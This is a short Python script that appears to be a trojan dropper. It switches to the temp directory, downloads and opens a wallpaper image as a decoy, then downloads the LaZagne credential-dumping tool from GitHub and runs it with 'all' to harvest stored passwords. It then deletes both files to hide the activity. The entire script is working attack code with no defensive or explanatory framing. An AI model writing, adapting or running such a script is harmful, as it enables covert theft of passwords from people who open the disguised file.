#!/usr/bin/env python

import requests, subprocess, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://wallpapercave.com/wp/wp2601077.png")
subprocess.Popen("wp2601077.png", shell=True)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
subprocess.call("lazagne.exe all", shell=True)
os.remove("wp2601077.png")
os.remove("lazagne.exe")

